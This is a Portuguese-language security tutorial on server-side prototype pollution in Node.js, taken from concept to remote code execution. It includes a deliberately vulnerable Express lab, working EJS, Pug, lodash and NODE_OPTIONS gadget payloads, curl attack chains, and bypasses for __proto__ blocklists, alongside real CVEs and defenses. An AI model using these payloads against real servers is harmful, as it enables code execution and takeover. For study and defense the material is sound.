---
title: "Server-side Prototype Pollution: da chave __proto__ ao RCE"
published: true
tags: [appsec, prototype-pollution, javascript, nodejs, web-security, pt-br]
---

## Por que isso importa

Em 2023 eu escrevi sobre prototype pollution e tratei o assunto como uma curiosidade do JavaScript: "olha que engraçado, dá pra escrever no protótipo". Eu estava subestimando o problema. A versão que importa de verdade, a que tira aplicação do ar e dá shell em servidor de produção, acontece no backend, persiste na memória do processo e afeta todos os usuários de uma vez. E quase ninguém olha pra ela com o cuidado que merece, porque o exemplo de `isAdmin: true` parece bobo demais pra ser perigoso.

A pergunta que organiza este post é a mesma que eu uso em todo code review de Node: quando este objeto recebe uma chave que veio do atacante, quem decide o que essa chave significa? Se a resposta for "o runtime, na hora da atribuição", você tem prototype pollution. E se mais adiante alguma biblioteca ler uma propriedade que o atacante plantou no protótipo, você tem muito mais do que um booleano trocado, você tem execução remota de código.

Este post pega o exemplo de `merge` que eu mostrei no post sobre inferência de tipo e leva ele até o fim: do conceito ao shell, com três labs reproduzíveis, os gadgets de RCE que funcionam de verdade, os CVEs que provaram a tese em produção, e as defesas que de fato fecham a porta. A tese continua a mesma do blog inteiro: uma vulnerabilidade é uma pré-condição que o código assume mas não garante. Aqui a pré-condição é "as chaves deste input são apenas nomes de propriedade comuns", e ela é falsa por design quando o consumidor escreve propriedades a partir do input.

### Público-alvo

- Pentesters e gente de AppSec que já ouviu falar de prototype pollution mas nunca levou a poluição até RCE
- Desenvolvedores Node que usam `merge`, `defaultsDeep`, `set` por caminho, ou binding automático sem saber o que está exposto
- Quem estuda pra OSWE, faz bug bounty no ecossistema JavaScript, ou pesquisa gadgets server-side

## Parte 1: o fundamento, por que o protótipo é alcançável

Todo objeto em JavaScript tem uma referência interna para outro objeto, o protótipo, de onde herda propriedades. Quando você lê `obj.x` e `obj` não tem `x` como propriedade própria, o runtime sobe na cadeia de protótipos e procura lá. No topo dessa cadeia está o `Object.prototype`, do qual quase todo objeto herda.

A leitura de propriedade é o ponto que torna a poluição perigosa. Se eu escrever uma propriedade nova em `Object.prototype`, todo objeto que não tiver aquela propriedade como própria vai herdar o valor que eu plantei. Em um processo Node, isso significa que uma única escrita afeta todos os objetos vivos e todos os que ainda vão ser criados, até o processo reiniciar.

### As três vias de acesso ao protótipo

Existem três formas de, a partir de uma chave de string, alcançar o protótipo. Você precisa conhecer as três, porque defesas que fecham uma esquecem das outras.

1. A chave `__proto__`. Em um objeto literal, `obj.__proto__` é um acessor para o protótipo de `obj`. Escrever em `obj.__proto__.x = 1` escreve em `Object.prototype.x`.

2. O caminho `constructor.prototype`. Todo objeto tem uma propriedade `constructor` que aponta para a função construtora, e essa função tem uma propriedade `prototype` que é o mesmo `Object.prototype`. Logo, `obj.constructor.prototype.x = 1` tem o mesmo efeito de poluir, sem usar a string `__proto__`. Esta via é a que contorna a maioria dos filtros ingênuos.

3. Acesso programático via `Object.getPrototypeOf` e `Object.setPrototypeOf`. Menos comum como vetor de input, mas relevante em código que manipula protótipos explicitamente.

Grave as duas primeiras, porque é nelas que mora a exploração via input: `__proto__` e `constructor.prototype`.

### Client-side versus server-side: o salto de patamar

No client-side, a poluição vive em uma aba do navegador. O impacto típico é DOM XSS quando um gadget do front-end lê uma propriedade poluída e a usa em um sink como `innerHTML` ou na criação de um script. Sério, mas confinado àquele usuário e àquela sessão.

No server-side, a poluição vive na memória do processo Node, que é compartilhada por todas as requisições de todos os usuários. Três consequências mudam o jogo:

- Persistência: a propriedade plantada fica no `Object.prototype` até o processo reiniciar. Uma única requisição contamina o estado global.
- Alcance: qualquer requisição subsequente, de qualquer usuário, lê o valor poluído. Isso vira negação de serviço trivial, basta poluir uma propriedade que quebre o processamento.
- Escalonamento para RCE: o servidor tem acesso a APIs perigosas, como `child_process` e compilação de templates, que o navegador não tem. É isso que transforma uma chave em shell.

## Parte 2: os vetores de poluição

A poluição precisa de um sink que escreva propriedades em um objeto usando chaves vindas do input. Os vetores mais comuns:

### Merge recursivo

O clássico, presente em milhares de bibliotecas e em muito código caseiro:

```javascript
function merge(destino, fonte) {
  for (const chave in fonte) {
    if (typeof fonte[chave] === "object" && fonte[chave] !== null) {
      if (!destino[chave]) destino[chave] = {};
      merge(destino[chave], fonte[chave]);
    } else {
      destino[chave] = fonte[chave];
    }
  }
  return destino;
}
```

O ponto fatal é `destino[chave]` quando `chave` vale `"__proto__"`. Na recursão, `merge(destino["__proto__"], fonte["__proto__"])` passa a escrever direto no `Object.prototype`.

### Set por caminho de string

Funções como `lodash.set`, `dot-prop` e similares recebem um caminho como `"a.b.c"` e criam a estrutura aninhada. Se o caminho vem do input, um caminho como `"__proto__.x"` ou `"constructor.prototype.x"` polui:

```javascript
const _ = require("lodash");
_.set({}, "constructor.prototype.poluido", "sim");
console.log(({}).poluido); // "sim"
```

### Clone profundo e defaults

`defaultsDeep`, `clone` profundo e funções de configuração que copiam recursivamente herdam o mesmo problema do merge.

### Parsers de query string

Parsers como o `qs`, usado pelo Express, interpretam colchetes na query string como estrutura aninhada. Uma query como `?a[__proto__][x]=1` pode virar uma escrita no protótipo dependendo da versão e da configuração. Esse vetor é especialmente perigoso porque não exige body JSON, basta a URL.

### A sutileza que separa quem entende de quem decora

O `JSON.parse` produz um objeto de dados puro. A string `"__proto__"` ali dentro é só uma chave. A inferência perigosa não está no parsing, está no consumidor, no `merge` ou no `set`, que ao escrever a propriedade reinterpreta `"__proto__"` como acessor de protótipo. O formato é inocente, o código que consome a chave é que infere. Por isso JSON continua sendo um formato seguro, e ainda assim prototype pollution existe. Guarde isso, porque é o motivo de a defesa ter que estar no consumidor, não no parser.

## Lab 1: poluição e bypass de lógica

Crie um projeto mínimo. Você precisa de Node 16 ou superior.

```bash
mkdir lab-sspp && cd lab-sspp
npm init -y
npm install express@4
```

`app.js`:

```javascript
const express = require("express");
const app = express();
app.use(express.json());

function merge(destino, fonte) {
  for (const chave in fonte) {
    if (typeof fonte[chave] === "object" && fonte[chave] !== null) {
      if (!destino[chave]) destino[chave] = {};
      merge(destino[chave], fonte[chave]);
    } else {
      destino[chave] = fonte[chave];
    }
  }
  return destino;
}

const configUsuario = {};

app.post("/perfil", (req, res) => {
  merge(configUsuario, req.body);
  res.json({ ok: true, perfil: configUsuario });
});

app.get("/status", (req, res) => {
  const obj = {};
  res.json({ admin: obj.isAdmin === true ? "sim" : "nao" });
});

app.listen(3000, () => console.log("lab-sspp em http://localhost:3000"));
```

Suba com `node app.js`.

### Passo 1: confirmar a poluição

Em estado limpo, `/status` responde `{"admin":"nao"}`. Agora envie o payload:

```bash
curl -s -X POST http://localhost:3000/perfil \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```

E consulte de novo:

```bash
curl -s http://localhost:3000/status
# {"admin":"sim"}
```

O endpoint `/status` cria um objeto vazio e lê `isAdmin`. Ele nunca recebeu essa propriedade, mas a herda do protótipo poluído. Em uma aplicação real, esse `obj.isAdmin` poderia ser o resultado de uma checagem de autorização que de repente passa a retornar `true` pra todo mundo, em todas as requisições, até o restart.

### Passo 2: a via que contorna filtros

Reinicie o processo para limpar o estado e teste a segunda via:

```bash
curl -s -X POST http://localhost:3000/perfil \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'
curl -s http://localhost:3000/status
# {"admin":"sim"}
```

Mesma poluição, sem a string `__proto__`. Qualquer defesa que só procure `__proto__` deixa este payload passar. Guarde os dois vetores, você sempre testa ambos.

## Parte 3: detecção black-box, sem o código-fonte

Em um teste de caixa preta você não vê o `merge`. Precisa de um sinal observável. A pesquisa de referência aqui é a do Gareth Heyes no PortSwigger, que catalogou propriedades que o próprio Node e os frameworks leem internamente, de forma que poluí-las muda o comportamento visível da resposta.

### Sinal por status code

Algumas propriedades internas do parser HTTP do Node, quando poluídas, fazem o servidor responder com erro. Um exemplo documentado é poluir uma propriedade que altera o limite de cabeçalhos ou o comportamento de parsing, provocando uma mudança de 200 para 400 ou 500 nas requisições seguintes. Você estabelece a base, envia a poluição, e observa a mudança de status.

### Sinal por espaçamento de JSON

O Express e muitos handlers usam `JSON.stringify` para serializar a resposta. A opção de indentação pode ser herdada do protótipo em certos caminhos. Poluir a propriedade que controla o número de espaços faz a resposta JSON mudar de compacta para indentada, um sinal visível e inequívoco de que a poluição pegou.

```bash
# sonda de espacamento, a resposta passa a vir indentada se poluivel
curl -s -X POST http://alvo/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": 10}}'
```

Se a próxima resposta JSON vier com indentação de 10 espaços, você confirmou SSPP sem ver uma linha de código.

### Sinal por content-type e charset

Poluir propriedades que influenciam negociação de conteúdo ou charset pode mudar o header `Content-Type` da resposta, outro sinal black-box confiável.

### Sinal por erro de parsing

Poluir uma propriedade que o parser de corpo lê, como o limite de parâmetros ou o tipo esperado, pode provocar erro 500 nas requisições seguintes. A mudança de comportamento é o sinal.

### Tabela de propriedades sondáveis

Estas são propriedades que o Node e o Express leem internamente, úteis como sonda de detecção em caixa preta. Poluir cada uma produz um efeito observável diferente na resposta.

| Propriedade poluída         | Efeito observável                                  | Onde é lida              |
|-----------------------------|----------------------------------------------------|--------------------------|
| `json spaces`               | Resposta JSON passa a vir indentada                | Express, `res.json`      |
| `status` ou `statusCode`    | Status code da resposta muda                       | Camada HTTP              |
| `content-type` ou `type`    | Header Content-Type da resposta muda               | Negociação de conteúdo   |
| `exposedHeaders`            | Headers CORS expostos mudam                        | Middleware de CORS       |
| `parameterLimit`            | Erro de parsing em corpos com muitos parâmetros    | Body parser              |
| `0`                         | Comportamento de funções que iteram índices muda   | Diversos                 |

O fluxo é sempre o mesmo: meça a base, polua a propriedade, repita a requisição e observe a mudança. Indentação de JSON é a sonda mais limpa, porque é binária e visível a olho nu.

### Roteiro de detecção

1. Estabeleça o comportamento base de um endpoint que reflete ou serializa dados.
2. Envie a poluição testando as duas chaves, `__proto__` e `constructor.prototype`, e as propriedades sondáveis conhecidas.
3. Repita a requisição base e procure qualquer mudança: status, indentação, header, latência.
4. Limpe o estado em um ambiente reiniciável, porque a poluição persiste e contamina os próximos testes. Isso é importante em produção, onde você não deve deixar o processo poluído.

Ferramental: o Burp tem extensões para esse fluxo, e o DOM Invader do PortSwigger cobre o lado client-side. Para o server-side, a coleção de gadgets e sondas do time de pesquisa do PortSwigger é o ponto de partida.

## Parte 4: da poluição ao RCE, os gadgets

Poluir um booleano é bypass de lógica. Pra chegar em RCE você precisa de um gadget: um trecho de código legítimo que lê uma propriedade do protótipo e a usa em uma operação perigosa. O atacante não injeta código, ele planta um valor que um sink existente vai interpretar como código ou como argumento de comando.

A razão de esses gadgets existirem é um padrão idiomático: bibliotecas leem opções com `options.x || valorPadrao`. Quando `options` não define `x`, o `options.x` sobe pela cadeia de protótipos e encontra o valor poluído. A biblioteca achou que estava lendo o default, e leu o que o atacante plantou.

### Gadget de template engine: EJS

Engines compilam templates em funções JavaScript em tempo de execução, lendo opções de um objeto. No EJS, a opção `outputFunctionName` é concatenada diretamente no corpo da função compilada. Se ela não estiver definida, o EJS a lê do protótipo, que você poluiu.

Payload:

```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
```

Quando o servidor compilar o próximo template EJS, o valor entra no código gerado e o `execSync` roda. Existem variantes que abusam de `escapeFunction`, `localsName` e `client`, dependendo da versão.

### Gadget de template engine: Pug

No Pug, a compilação aceita opções que controlam o corpo da função gerada. Poluir uma propriedade que entra na função compilada injeta código que roda na renderização do próximo template. O payload tem a forma de um bloco que o compilador concatena no corpo da função:

```json
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
```

A estrutura exata do nó depende da versão do Pug, porque o formato da AST muda. A ideia constante: o Pug lê parte da árvore de compilação de um objeto que, faltando a propriedade, sobe ao protótipo poluído.

### Gadget de template engine: Handlebars

No Handlebars, gadgets conhecidos abusam de opções de compilação que aceitam comportamento, como as que controlam a função de saída ou o ambiente de compilação. Poluindo a propriedade certa, a função compilada passa a incluir o código do atacante. O padrão é o mesmo das outras engines.

### Gadget de lodash.template

O `lodash.template` aceita uma opção `sourceURL` e variáveis de interpolação que, quando lidas do protótipo, podem injetar código no corpo da função compilada. Esse gadget é relevante porque o lodash está em quase todo projeto Node, então a probabilidade de o gadget estar disponível no classpath efetivo é alta.

```json
{"__proto__": {"sourceURL": "\u000aprocess.mainModule.require('child_process').execSync('id')\u000a"}}
```

O `\u000a` é uma quebra de linha que fecha o comentário gerado e injeta a linha de código. Versões recentes mitigaram parte disso, então confirme na sua.

### Por que toda engine tem um gadget

Não é coincidência que EJS, Pug, Handlebars e lodash.template tenham todos o mesmo problema. A causa é estrutural: engines de template compilam strings em funções JavaScript em runtime, e leem dezenas de opções de configuração de um objeto. Sempre que uma opção não é passada explicitamente, ela é lida com `options.x`, que sobe pela cadeia de protótipos. Compilação em runtime mais leitura de opções por herança é a receita do gadget. Qualquer engine que faça as duas coisas é candidata, e o trabalho do atacante é só descobrir qual opção entra no corpo da função compilada.

### Gadget de child_process

O Node lê opções de `spawn`, `exec` e `fork` de um objeto de options. Três propriedades são perigosas quando lidas do protótipo:

- `shell`: poluir com um caminho de interpretador muda como o comando é executado.
- `env`: poluir o ambiente do processo filho. Combinado com `NODE_OPTIONS`, vira carregamento de código.
- `argv0` e similares em casos específicos.

O caminho mais limpo costuma ser poluir `NODE_OPTIONS` com `--require /caminho/controlado`, de forma que qualquer `fork` subsequente carregue um módulo que o atacante controla. Isso exige que a aplicação dispare um processo filho depois da poluição, o que é comum em servidores que geram PDF, processam imagem ou rodam jobs assíncronos.

```json
{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/payload.js"}, "shell": "/bin/sh"}}
```

## Lab 2: SSPP até RCE via EJS

Estenda o Lab 1 com um sink de template. Instale o EJS:

```bash
npm install ejs@3
```

Adicione ao `app.js`:

```javascript
const ejs = require("ejs");

app.get("/render", (req, res) => {
  // compila um template simples a cada request, sem passar options
  const html = ejs.render("<p>oi <%= 'mundo' %></p>", {});
  res.send(html);
});
```

A cadeia completa:

```bash
# 1. polui outputFunctionName no protótipo
curl -s -X POST http://localhost:3000/perfil \
  -H "Content-Type: application/json" \
  -d "{\"__proto__\": {\"outputFunctionName\": \"x;console.log(process.mainModule.require('child_process').execSync('id').toString());s\"}}"

# 2. dispara a compilação do template, que agora executa o gadget
curl -s http://localhost:3000/render
```

No terminal do `node app.js`, você vê a saída do comando `id`. Saímos de uma chave de dados em um POST para execução de código no processo do servidor, sem nunca enviar código no sentido tradicional.

Nota de reprodução honesta: o nome exato da opção e o formato do payload variam com a versão do EJS, e versões mais recentes blindaram parte das opções. Reproduza no seu lab, fixe a versão que citar no post, e ajuste o payload. Essa é a parte que muda mais rápido, e citar uma versão errada queima o post.

## Lab 3: SSPP até RCE via NODE_OPTIONS

Este lab modela o caso em que a aplicação dispara um processo filho. Crie um arquivo de payload:

```bash
echo "require('child_process').execSync('id > /tmp/pwned')" > /tmp/payload.js
```

Adicione um endpoint que faz um `fork` depois da poluição, simulando um job:

```javascript
const { fork } = require("child_process");
app.get("/job", (req, res) => {
  // fork sem passar env explicito: herda env, que pode estar poluido
  const filho = fork(__filename, [], { silent: true });
  res.json({ disparado: true });
});
```

Cadeia:

```bash
# 1. polui NODE_OPTIONS no protótipo
curl -s -X POST http://localhost:3000/perfil \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"env": {"NODE_OPTIONS": "--require /tmp/payload.js"}}}'

# 2. dispara o job, cujo fork herda o NODE_OPTIONS poluido
curl -s http://localhost:3000/job
cat /tmp/pwned
```

O arquivo `/tmp/pwned` contém a saída de `id`, provando execução. A viabilidade depende de a aplicação realmente disparar o processo filho sem sobrescrever `env`, o que é mais comum do que parece. Documente no seu post a versão do Node, porque o tratamento de `env` herdado mudou ao longo das versões.

## Parte 5: CVEs reais, a tese provada em produção

### CVE-2019-10744, lodash defaultsDeep

A função `defaultsDeep` do lodash, biblioteca com dezenas de milhões de downloads por mês, podia ser enganada para escrever em `Object.prototype` via um payload `{"constructor": {"prototype": {...}}}`. Repare que esse payload não usa `__proto__`, ele alcança o protótipo por `constructor.prototype`, exatamente o vetor que fura defesas ingênuas. O impacto não ficou na teoria: aplicações que liam configuração de objetos comuns passaram a herdar valores plantados, abrindo de bypass de autorização a RCE quando havia gadget de template no caminho.

### CVE-2019-11358, jQuery extend

A função `jQuery.extend(true, ...)`, em versões anteriores à 3.4.0, fazia merge profundo sem proteger contra `__proto__`. Embora jQuery seja client-side, o caso é instrutivo porque mostra a mesma falha em uma das bibliotecas mais distribuídas da história, e porque muitos servidores Node carregavam jQuery para manipulação de DOM no lado servidor.

### CVE-2020-7598, minimist

O `minimist`, parser de argumentos de linha de comando, em versões anteriores à 1.2.2 permitia poluição via argumentos como `--__proto__.x valor`. Como o minimist é dependência transitiva de milhares de pacotes, o alcance foi enorme. Lição de supply chain: a poluição entrou por uma dependência que ninguém olhava diretamente.

### CVE-2022-24999, qs e Express

O `qs`, parser de query string usado pelo Express, teve uma falha que permitia poluição via query string com colchetes apontando para `__proto__`. Esse é um caso server-side puro e perigoso, porque dispensa body JSON: a poluição vinha na própria URL, em um `GET`. Mostra que limitar a atenção ao body é um erro.

### CVE-2019-7609, Kibana, prototype pollution até RCE

O caso que eu mais gosto de citar, porque fecha o arco. Uma prototype pollution no Timelion do Kibana podia ser encadeada até execução de código no servidor, abusando de um gadget que terminava em processo filho do Node. É a prova de que a cadeia "chave no input vira shell" não é exercício acadêmico, ela comprometeu um produto amplamente usado em infraestrutura de observabilidade.

O fio condutor dos cinco: nenhum foi corrupção de memória exótica. Todos foram o consumidor escrevendo, a partir de uma chave controlável, em um lugar que o desenvolvedor não sabia que era alcançável.

## Parte 6: second-order e o lado client-side

### Poluição armazenada e second-order

Nem toda poluição acontece na mesma requisição em que é explorada. Considere um fluxo em que as preferências do usuário são salvas no banco e, em um job noturno ou em uma requisição posterior, carregadas e mergeadas em um objeto de configuração. O atacante salva um valor que parece inofensivo, com uma chave `__proto__`, e a poluição só dispara quando o job roda. Isso é second-order prototype pollution.

O perigo do second-order é duplo. Primeiro, ele escapa de testes que olham só a resposta imediata, porque o efeito aparece depois, em outro contexto. Segundo, ele frequentemente roda em um contexto mais privilegiado, como um worker que processa dados de todos os usuários, o que amplia o impacto. Ao fazer o taint, trate todo dado que sai do banco e alimenta um merge como tainted, exatamente como você trataria um input direto. O fato de ter passado pelo banco não lava o taint.

Um exemplo de fluxo vulnerável:

```javascript
// na escrita: salva preferencias cruas no banco
await db.salvar("prefs:" + userId, req.body);

// em outro lugar, mais tarde: carrega e faz merge no config global
const prefs = await db.ler("prefs:" + userId);
merge(configGlobal, prefs); // poluicao dispara aqui, fora da request original
```

A defesa é a mesma: valide com schema na escrita, e use objetos sem protótipo no merge. Mas a detecção exige rastrear o dado através do banco, o que só uma análise de second-order encontra.

### O lado client-side: gadgets de DOM XSS

Embora este post seja sobre o server-side, vale entender o primo client-side, porque a mecânica de poluição é idêntica e muda só o sink. No navegador, depois de poluir o protótipo via um vetor como parsing de query string ou de hash, o gadget é um trecho de código do front-end que lê uma propriedade do protótipo e a usa em um sink de DOM.

Gadgets clássicos no client-side:

- Bibliotecas que leem `options.html` ou `options.template` do protótipo e injetam em `innerHTML`, levando a XSS.
- Frameworks que leem uma propriedade de configuração de script ou de URL do protótipo e a usam para carregar recursos, levando a injeção de script.
- Sanitizadores que leem uma allowlist do protótipo e, com ela poluída, deixam passar tags perigosas.

A diferença de impacto é o que separa os dois mundos: client-side termina em XSS naquela sessão, server-side termina em RCE no processo que atende todo mundo. Mas a pergunta de caça é a mesma: existe um gadget que lê do protótipo e usa em um sink perigoso? No navegador o sink é o DOM, no servidor é o `child_process` e a compilação de template.

## Parte 7: bypasses de defesa

Defesas mal feitas criam falsa sensação de segurança. Conheça os bypasses para não confiar nelas.

### Bypass de blocklist de __proto__

Se a defesa filtra apenas a string `__proto__`, use `constructor.prototype`:

```json
{"constructor": {"prototype": {"poluido": "sim"}}}
```

### Bypass por aninhamento e reconstrução de chave

Filtros que só olham o primeiro nível de chaves perdem a poluição aninhada. E filtros que removem a substring `__proto__` de forma não recursiva podem ser contornados com `__pro__proto__to__`, que após a remoção da substring central reconstrói `__proto__`. Sempre que vir um filtro baseado em `replace`, teste reconstrução.

### Bypass por encoding em parsers específicos

Em alguns parsers, chaves com codificação ou com separadores alternativos chegam ao sink como `__proto__` após normalização. Teste variações de encoding na query string e em formatos como `multipart`.

### Por que Object.freeze parcial falha

Congelar apenas `Object.prototype` mas esquecer de proteger `Array.prototype`, `Function.prototype` e os protótipos de tipos específicos deixa vetores abertos para gadgets que leem propriedades desses protótipos. A proteção precisa ser abrangente, ou o atacante mira no protótipo que ficou de fora.

### Bypass de schema aplicado tarde demais

Se a aplicação valida o objeto com schema mas faz o `merge` no objeto cru antes da validação, a poluição já aconteceu. A ordem importa: a inferência tem que acontecer depois da validação, sobre o objeto validado, não sobre o cru.

## Parte 8: como caçar isso na prática

As três perguntas da série, aplicadas a SSPP.

### 1. Onde o sistema escreve em um objeto usando uma chave vinda do input?

Procure por `merge`, `defaultsDeep`, `extend`, `assign` recursivo, `set` por caminho de string como `lodash.set` e `dot-prop`, `clone` profundo, e binding automático de body para objeto. O sinal é uma escrita `destino[chaveControlavel] = ...` onde a chave não foi validada.

### 2. O atacante controla as chaves, não só os valores?

Faça o taint do source ao sink: body JSON, query string com colchetes, parâmetros de rota, headers, e campos lidos do banco que vieram de input. Lembre que dado que passou por fila, cache ou banco mantém o taint. Uma poluição armazenada e aplicada depois conta como second-order, e é das mais difíceis de achar.

### 3. Existe um sink que lê propriedades do protótipo depois da poluição?

Template engines, opções de `child_process`, e o padrão `options.x || default` em qualquer biblioteca. O gap entre a escrita poluída e a leitura no sink é onde a cadeia vira RCE. Mapeie todos os pontos onde o código lê opções sem definir todas explicitamente.

### Caçando em escala

Regra de Semgrep para o merge recursivo vulnerável:

```yaml
rules:
  - id: merge-recursivo-sem-protecao-proto
    languages: [javascript]
    message: Merge recursivo pode poluir o protótipo se a chave nao for validada
    severity: WARNING
    patterns:
      - pattern: |
          for (... in $FONTE) {
            ...
            $DESTINO[$CHAVE] = $FONTE[$CHAVE];
            ...
          }
```

Em CodeQL, modele `req.body`, `req.query` e `req.params` como sources e as funções de merge e set como sinks, e procure fluxo entre eles. O scanner aponta onde a chave controlável encontra a escrita de propriedade. A cadeia de impacto, do booleano ao RCE, continua sendo análise sua.

## Parte 9: defesas que funcionam

A defesa não é validar melhor, é tirar o protótipo da jogada. A ordem importa: prefira soluções estruturais, deixe a blocklist como último reforço.

### 1. Objetos sem protótipo

Para acumular dados vindos do usuário, use objetos que não têm protótipo poluível:

```javascript
const dados = Object.create(null); // sem cadeia de protótipo
const mapa = new Map();             // Map nao usa Object.prototype como cadeia
```

### 2. Schema rígido antes de usar

Valide o input contra um schema que rejeita chaves desconhecidas, e use o objeto validado, nunca o cru. Com Ajv, ligue `additionalProperties: false`:

```javascript
const Ajv = require("ajv");
const ajv = new Ajv({ removeAdditional: true });
const schema = {
  type: "object",
  properties: { tema: { type: "string" }, idioma: { type: "string" } },
  additionalProperties: false, // rejeita __proto__ e qualquer chave extra
};
const validar = ajv.compile(schema);
if (!validar(req.body)) throw new Error("payload invalido");
```

Com zod:

```javascript
const { z } = require("zod");
const PerfilSchema = z.object({ tema: z.string(), idioma: z.string() }).strict();
const perfil = PerfilSchema.parse(req.body);
```

### 3. Parser de JSON seguro

Use um parser que rejeita ou neutraliza `__proto__` no momento do parse, como o `secure-json-parse`, ou um reviver no `JSON.parse`:

```javascript
const dados = JSON.parse(texto, (chave, valor) => {
  if (chave === "__proto__") return undefined;
  return valor;
});
```

Lembre que o reviver simples não cobre `constructor.prototype`, então combine com as defesas estruturais.

### 4. Congele os protótipos

Em runtimes que permitem, congele os protótipos no boot, depois de carregar as dependências:

```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
```

Teste bem, porque algumas bibliotecas escrevem no protótipo legitimamente no startup. Congele depois do load.

### 5. Flag de runtime do Node

```bash
node --disable-proto=throw app.js
```

Transforma o acesso a `__proto__` por essa via em erro. Confirme o comportamento na sua versão. Fecha a via da string, mas `constructor.prototype` exige as defesas anteriores.

### 6. Defesa em profundidade

Trate merge e binding como operações perigosas. Rode com privilégio mínimo, monitore instanciações e comportamentos inesperados, e nunca confie que "esse input é interno". Input que veio de uma fila interna ainda é input.

### 7. Escolha bibliotecas que já se protegem

Nem toda biblioteca de merge é insegura. As versões atuais de muitas delas já verificam a chave antes de escrever. Ao escolher uma dependência que faz merge, clone ou set por caminho, prefira as que documentam proteção contra poluição e fixe a versão. Como referência rápida:

- Use `lodash.merge` e `lodash.defaultsDeep` apenas em versões corrigidas, e mesmo assim com schema na frente.
- Prefira `Object.assign` raso a merges profundos quando o caso permitir, porque o raso não desce na estrutura aninhada onde a poluição mora.
- Para parsing de JSON não confiável, prefira `secure-json-parse` a `JSON.parse` cru.
- Para configuração, prefira `Map` a objeto literal sempre que a leitura por chave for dinâmica.

Trate a escolha de biblioteca como decisão de segurança, não só de conveniência. Uma dependência transitiva vulnerável, como o minimist no CVE-2020-7598, reabre a porta que você fechou no seu código.

### Checklist de revisão de pull request

Quando eu reviso código Node procurando essa classe, eu marco:

- Todo `merge`, `set` por caminho e `clone` profundo que recebe dado de request
- Todo `options.x` lido sem que todas as opções tenham sido definidas explicitamente
- Todo objeto que acumula input e é depois lido por chave dinâmica, candidato a virar `Map` ou `Object.create(null)`
- Toda validação de schema que roda depois do merge em vez de antes
- Todo parser de query string com colchetes habilitado em endpoint que não precisa de estrutura aninhada

Cinco itens, e você cobre a esmagadora maioria dos casos de SSPP em uma base Node.

## Conclusão

O que vale guardar:

- Prototype pollution no servidor não é curiosidade de linguagem, é poluição persistente na memória de um processo que atende todos os usuários.
- A chave perigosa não é interpretada pelo formato, é interpretada pelo consumidor. JSON é inocente, o `merge` e o `set` é que inferem. Por isso a defesa fica no consumidor.
- Existem duas vias de input que você sempre testa: `__proto__` e `constructor.prototype`. Defesa que só fecha a primeira é falsa segurança, como o lodash provou.
- Poluir um booleano é bypass de lógica. Encadeado com gadget de template engine ou de `child_process`, vira RCE, como Kibana provou em produção.
- Em caixa preta, detecte pela mudança de comportamento observável: status code, indentação de JSON, content-type.
- A defesa é estrutural: objetos sem protótipo, schema rígido com `additionalProperties: false`, congelar os protótipos. Blocklist é reforço, nunca solução.

Se você internalizar a pergunta "quem decide o significado desta chave", para de ver prototype pollution como truque e passa a ver como caso particular da mesma doença de sempre: o sistema decidindo, a partir do input, o que aquele dado significa.

### Próximos passos

- Gadget chains em Java: a mesma ideia de "valor plantado vira execução", com tipos vindos no stream serializado
- Mass assignment: quando o binding automático escreve campos que você nunca quis expor

### Referências

- Olivier Arteau, "Prototype Pollution Attack in NodeJS Application", NorthSec 2018
- Gareth Heyes, "Server-side prototype pollution: How to detect and exploit", PortSwigger Research
- CVE-2019-10744, lodash defaultsDeep, prototype pollution via constructor.prototype
- CVE-2019-11358, jQuery.extend, prototype pollution
- CVE-2020-7598, minimist, prototype pollution via argumentos
- CVE-2022-24999, qs e Express, prototype pollution via query string
- CVE-2019-7609, Kibana Timelion, prototype pollution encadeada até RCE
- Documentação do Node.js, flag --disable-proto
- Pacote secure-json-parse, parsing de JSON resistente a poluição
- OWASP, "Prototype Pollution"
